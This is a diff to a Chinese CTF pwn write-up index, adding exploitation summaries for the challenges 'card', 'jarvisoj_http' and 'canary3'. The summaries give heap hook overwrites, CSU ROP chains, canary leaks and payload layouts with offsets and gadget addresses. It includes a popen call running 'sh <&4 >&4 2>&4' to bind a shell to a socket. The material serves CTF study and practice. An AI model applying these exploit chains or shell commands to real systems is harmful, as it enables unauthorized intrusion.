@@ -80,6 +80,9 @@
 | 23 | `pwnable_orw` | seccomp 沙箱 + ORW shellcode / 32 位 | `sandbox_seccomp` | `read(0, 0x804a060, 0xc8)` 后直接 `call` 缓冲区；BPF 只放行 `open/read/write/exit`，写 51 字节 ORW shellcode 读 `flag.txt` | N/A（无栈溢出） | shellcode 落点 `0x804a060`、上限 `0xc8`、BPF 表 `0x8048640` |
 | 24 | `easyroptocol` | seccomp 沙箱 + 4 槽 message 叠加溢出 / 64 位 | `sandbox_seccomp` | 选项 3 把 4 条 message 从 `+0x18` 起 `memcpy` 到 `rbp-0x3020`，每条只增长 `0xfe8`，第 4 次覆盖 saved RIP；BPF 只 KILL `execve`/x32；CSU `write` leak libc 后删 slot3 重建，用 `read` 把 open/exit 地址写进 bss，再 `open`×3 → `read(3)` → `write(1)` | **0x3028**（chain 在消息 4 的 `+0x88`） | `csu_pop=0x401baa`、`csu_call=0x401b90`、`ret=0x40101a`、`main=0x401a5e`、`write@got=0x404028`、`read@got=0x404040`、bss `0x404700` |
 | 25 | `rec_33c3_2016` | 未初始化函数指针 + Polish `esp` 泄漏栈喷 / 32 位 PIE | `ret2libc` | Sign 在 `n==0` 时 `call [ebp-0x20]` 而槽位未赋值；Polish 求和循环 `sub esp,8` + 2×`push` 却只 `add esp,8`，每轮 `esp-=8` 并把操作数写到 `[esp-0xc]`/`[esp-0x10]`；喷 **0x63** 个数字把 `puts` / `___libc_start_main@got` 精确落到 `v1` / 首个参数；note 泄漏 PIE base | N/A（**无栈溢出**） | `puts@plt=text+0x520`、`lsm@got=text+0x2fe0`、note leak `text+0x6fb`、`call eax=0xd3e` |
+| 26 | `card` | tcache 1 字节溢出 + overlap + hook / 64 位 | `heap_exploitation` | unsorted bin 泄 `main_arena`；1 字节把 `B.size` 从 `0x21` 改成 `0x91` 造 overlap，伪造两个合法 `0x20` 块 free 进 tcache，改 `C2->fd = __free_hook`，写 `system` 后 `free("/bin/sh")` | `__free_hook=libc+0x3ED8E8`、`system=libc+0x4F440` | `arena = __malloc_hook+0x70`、A 用 `0xA8` 让溢出点贴住 `B.size` |
+| 27 | `jarvisoj_http` | 逐字节读请求 + CSU ROP / 64 位 No PIE | `ret2text` | `read_request` 逐字节读到 `\r\n\r\n` 无长度上限；栈上计数器 `cnt` 位于 `buf+0x20C`，直接打满会自覆盖回卷，需先用 `0x0F/0x00` 把它顶过 `0x210`；CSU 链 `read(4,CMD,0x400)` → `popen(CMD,"r")` → `waitpid`，`sh <&4 >&4 2>&4` 绑到 socket | saved RIP 在字节流 **0x216** | `CSU_POP=0x4015AA`、`CSU_CALL=0x401590`、`CMD=0x601E00`、`RSTR=0x601E80`、`popen@got=0x601C80`、端口 `htons(0x70f)=3847` |
+| 28 | `canary3` | canary 泄漏 + ret2libc / 64 位 PIE | `ret2libc` | 登录函数 `pw[n]=0` 且 `n` 可取 `0x20` → 打到 `hex@rbp-0x30` 首字节，`strcmp(md5(pw), hex)` 退化为“digest 首字节为 0”；菜单 `printf("%s", buf)` 两轮泄漏 canary + saved RIP，第三轮 ret2libc | 主函数 **0x28**（canary 0x18） | `buf=rbp-0x20`、canary `rbp-0x8`、口令 32 字节且 `md5(pw)[0]==0`、`read` 上限 `0x64` |
 | L1 | `lab_srop_baby`（自造） | SROP / 64 位静态汇编 | `srop` | `read(0, rsp, 0x400)` 溢出；只有 `syscall;ret` + `pop rax;ret`，无传参 gadget 无 libc → `rax=15` 触发 `rt_sigreturn`，sigframe 直接 `execve("/bin/sh")` | **0**（read 直接写 rsp） | `syscall;ret=0x401065`、`pop rax;ret=0x401068`、`bss=0x403010` |
 
 ---
@@ -858,6 +861,79 @@ stage2: 选项 2 删 slot3（chunk4 与 top 相邻，free 后并进 top）
 2.24-3ubuntu2.2（`ret2libc/libc-2.24.so`，与 old-releases 的
 `libc6_2.24-3ubuntu2.2_i386.deb` 解包结果 md5 一致）。
 
+### 3.26 `card` → `heap_exploitation`（tcache 1 字节溢出 + overlap）
+
+```text
+64 位 / PIE / Full RELRO / Canary / NX；libc 2.27（附件 libc.so）
+菜单：1.allocate(size) 2.read(不限长) 3.free(不清零) 4.write(n 可控)
+```
+
+判定与路径：
+
+1. `Full RELRO + PIE` → GOT 不可写，目标选 `__free_hook`（2.27 的 `free` 会查它）。
+2. 8 个 `0x88` 请求（chunk `0x90`）全 free：前 7 个进 `tcache[0x90]`，**第 8 个进 unsorted bin**；
+   掏空 tcache 后回取第 8 块，`fd/bk` 仍是 `main_arena+0x60`，选项 4 读 `0x88` 字节即得 libc。
+3. `create(0xA8)` 的 A 后面紧跟 `create(0x18)` 的 B，选项 2 写 `0xA8 + 1` 字节把 `B.size` 从
+   `0x21` 改成 `0x91`；free(B) 后按 `0x90` 重取，user 区正好盖到 C1/C2 的 chunk header。
+4. 用伪造 header（`prev_size=0`, `size=0x21`）把 C1/C2 变成两个合法 `0x20` 块，free 进
+   `tcache[0x20]`，再改 `C2->fd = __free_hook`，连续两次 malloc 就拿到 hook 并写入 `system`。
+5. 最后 `malloc("/bin/sh")` + `free` 触发 `system("/bin/sh")`。
+
+关键值：`__free_hook=libc+0x3ED8E8`、`system=libc+0x4F440`、`main_arena+0x60=__malloc_hook+0x70`。
+文档：`heap_exploitation/26_card_speedrun.md`；EXP：`26_card_exp.py`（本地需 `LD_SO` / `LIBC_DIR` 指 2.27）。
+
+### 3.27 `jarvisoj_http` → `ret2text`（逐字节读请求 + CSU ROP）
+
+```text
+64 位 / No PIE / No Canary / NX / 无 GNU_RELRO；监听 htons(0x70f) = 3847，accept 后 fork
+
+read_request @0x40125d:
+  buf = rbp-0x210; cnt @ rbp-4
+  while (read(fd,&c,1) > 0) { cnt++; buf[cnt-1] = c; if (cnt>3 && 末尾=="\r\n\r\n") break; }
+  buf[cnt] = 0;  ->  handle(buf)  ->  leave; ret
+```
+
+判定与路径：
+
+1. 逐字节读 + 只认 `\r\n\r\n` 结尾，**没有长度上限** → 直接栈溢出；`No PIE` 所以用
+   `__libc_csu_init`（`0x4015AA` pop 段 / `0x401590` call 段）调任意三参数函数。
+2. 坑一：`cnt = rbp-4 = buf+0x20C`，字节流写到 `0x20C` 会覆盖计数器最低字节导致回卷。
+   解法：`stream[0x20C]=0x0F`、`stream[0x20D]=0x00`，此后 `stream[0x20E+k]` 依次落在 `rbp+k`，
+   saved rbp `0x20E..0x215`、saved RIP **`0x216`**。
+3. 坑二：每个 CSU 块必须 `CSU_POP + 6 pop 值 + CSU_CALL + 7 填充`，尾部 `ret` 直接落到
+   **下一块段首的 `CSU_POP`**；把 `CSU_POP` 同时当上一块 `ret_addr` 会造成整体错位一个 qword。
+4. 链：`read(4, CMD, 0x400)` → `popen(CMD, "r")` → `waitpid(0,0,0)`，`CMD="sh <&4 >&4 2>&4"`；
+   可写页只有 `0x601000~0x602000`，所以 `CMD=0x601E00`、`RSTR=0x601E80`（`0x602200` 会 `EFAULT`）。
+5. 本机 WSL2 的 loopback TCP 不可用（SYN 被 RST，Python/C server 均可复现），验证时用
+   `tools/loopback_unix_shim.c`（`LD_PRELOAD`，AF_INET→AF_UNIX，`USE_UNIX=1`）；远程靶机照常用 TCP。
+
+文档：`ret2text/27_jarvisoj_http_speedrun.md`；EXP：`27_jarvisoj_http_exp.py`。
+
+### 3.28 `canary3` → `ret2libc`（canary 泄漏 + ret2libc）
+
+```text
+64 位 / PIE / NX / Partial RELRO / Canary / stripped；strings 乱码（运行时解密）
+
+login @0x2280:
+  read(0, user@rbp-0x70, 0x20)            # "admin"
+  n = read(0, pw@rbp-0x50, 0x20); pw[n] = 0    # n==0x20 时打到 hex@rbp-0x30
+  md5(pw) -> out@rbp-0x80; strcmp(user,"admin") && strcmp(out, hex)
+
+main（菜单，buf=rbp-0x20，canary=rbp-0x8）：
+  1.leak printf("%s", buf)   2.overflow read(0, buf, 0x64)   3.exit strtol -> return 0
+```
+
+判定与路径：
+
+1. `pw[n] = 0` 是 off-by-one：发满 32 字节时把 `hex` 首字节清零，`strcmp` 退化成“digest 首字节为 0”，
+   脚本枚举 `c3%06d` 补点到 32 字节即可登录。
+2. 主函数 `printf("%s", buf)`：第一轮写 `0x19` 字节把 canary 的 `0x00` LSB 换掉，可取 7 个非零字节；
+   第二轮写 `'A'*0x19 + canary[1:] + 'B'*8` 继续吐 saved rbp / saved RIP（libc 地址）。
+3. libc 基址用“页对齐 + 就近匹配 `__libc_start_main`”反推，不依赖具体 glibc 版本。
+4. 第三轮写 `'A'*0x18 + canary + 'C'*8 + ret + pop rdi + /bin/sh + system`，再选 3 让 `main` 返回。
+
+文档：`ret2libc/28_canary3_speedrun.md`；EXP：`28_canary3_exp.py`。
+
 ### 3.L1 `lab_srop_baby` → `srop`（自造实验）
 
 ```text
@@ -957,9 +1033,11 @@ ret -> pop rax (=15) -> ret -> syscall  ==> rt_sigreturn
 
 ## 5. 待解登记（pending）
 
-以下二进制仍留在仓库根目录，尚未归档到模式目录，避免“强行套模板”造成错误结论。
+以下二进制仍在 `To Be Continued/` 里，尚未归档到模式目录，避免“强行套模板”造成错误结论。
 每节都做到“定性 + 阻塞点明确”，后续可以直接接着做。
-（`rec_33c3_2016` 已于 2026-11 解决，5.1 仅保留记录。）
+（`rec_33c3_2016` 已于 2026-11 解决，5.1 仅保留记录；`canary3` / `jarvisoj_http` / `card`
+于 2026-11-23 全部解决并归档，5.3 / 5.4 / 5.5 保留当时的阻塞记录供对照。）
+
 
 ### ~~5.1 `rec_33c3_2016`~~ ✅ 已完成
 
@@ -1010,7 +1088,17 @@ args 1..264 中不存在 0x804a0a0（flag），也不存在 0x804a010（strcmp@G
 3. 用 `%n` 把 `strchr@GOT` 改成 `main`（`0x804872b` ≈ 134M 字符，可接受），
    让程序跑第二轮 —— 第二轮 `strcmp` / `puts` 已解析，才有机会拿到 `0x804a010` 槽位。
 
-### 5.3 `PWN附件/canary3`（PIE + 字符串加密）
+**2026-11-23 复核**：重跑 `%1$p..%264$p` 全扫（`/tmp/audit/probe_judge.log`）仍无 `0x804a0a0` /
+`0x804a010` 槽位，可见栈上能用的指针只有 `strchr@GOT` 与 GOT 基址；按“20 分钟规则”暂时降级，
+状态保持 pending（下次从“`%n` 改 `strchr@GOT` → 第二轮”这条线继续）。
+
+### ~~5.3 `PWN附件/canary3`（PIE + 字符串加密）~~ ✅ 已完成（→ `ret2libc/28_canary3_*`）
+
+> **2026-11-23 更新**：已解，见 §3.28。当时判断对了 80%——确实是 PIE + Canary + 运行时解密，
+> 但真正的入口不是 `system@plt` 后门（PIE 下没基址，且泄漏通道被 canary 方案占用），
+> 而是登录函数的 `pw[n] = 0;` off-by-one（`n` 可取 `0x20`，正好清掉 `hex[0]`）。
+> 下面这段是最初的阻塞记录，保留作为对照。
+
 
 ```text
 64 位、PIE、NX、Partial RELRO、Canary、not stripped（无符号表）
@@ -1030,7 +1118,15 @@ strings 全为空/乱码（运行时解密）；导入里有 system@plt
 2. 断在 `0x2351` 的两处 `strcmp`，看比较的是输入 vs 全局字符串还是输入 vs 输入。
 3. 若 `system` 的参数可控（例如 `system(buf)` 且 buf 可写），走 `ret2text`；否则先 leak PIE/Canary。
 
-### 5.4 `jarvisoj_http`（端口 1807 的 httpd，`popen` 命令注入）
+### ~~5.4 `jarvisoj_http`（httpd，`popen` 命令注入）~~ ✅ 已完成（→ `ret2text/27_jarvisoj_http_*`）
+
+> **2026-11-23 更新**：已解，见 §3.27。两点修正：
+> 1. 端口是 `htons(0x70f)` → **3847**（不是 1807，之前把网络字节序看反了）；
+> 2. 不需要过 `check()`——`read_request` 的逐字节循环没有长度上限，直接栈溢出 + CSU ROP 起
+>    `popen("sh <&4 >&4 2>&4")` 就能在同一个连接里拿到 shell。
+>    `check()` 的密钥仍没解出来，但已被绕过，不再是阻塞项。
+> 下面这段是最初的阻塞记录，保留作为对照。
+
 
 ```text
 64 位、No PIE、NX；监听 0,0,0,0:1807（htons(0x70f)），accept 后 fork
@@ -1068,6 +1164,9 @@ handler      @0x40116c：
 | 二进制 | 保护 / 形态 | 已知信息 | 判定 |
 | --- | --- | --- | --- |
 | `publibc/bf` | PIE、Full RELRO、Canary；导入 `system` | 14KB，`scanf`/`getchar`/`putchar`/`malloc` + `system` —— 典型 brainfuck 解释器，越界指针对 tape 任意读写；Full RELRO 不能改 GOT | 需 hook / FSOP，30 分钟以上 |
-| `card/pwn` | PIE、Full RELRO、Canary；附件 `libc.so` | 10KB，`printf`/`__isoc99_scanf`/`malloc`/`free`/`read`/`write` —— 疑似“卡牌”堆题 | 需 PIE + heap leak，30 分钟以上 |
 
-> 以上 5.1–5.5 均按“20 分钟规则”降级：先保证已解题目归档完整，再回头做。
+> `card/pwn` 已于 2026-11-23 解决（`heap_exploitation/26_card_*`，见 §3.26），从本表移出。
+
+> 以上条目均按“20 分钟规则”降级：先保证已解题目归档完整，再回头做。
+> 2026-11-23 状态：5.3 / 5.4 / card 已完成；只剩 `judgement_mna_2016`（5.2）与 `publibc/bf`。
+
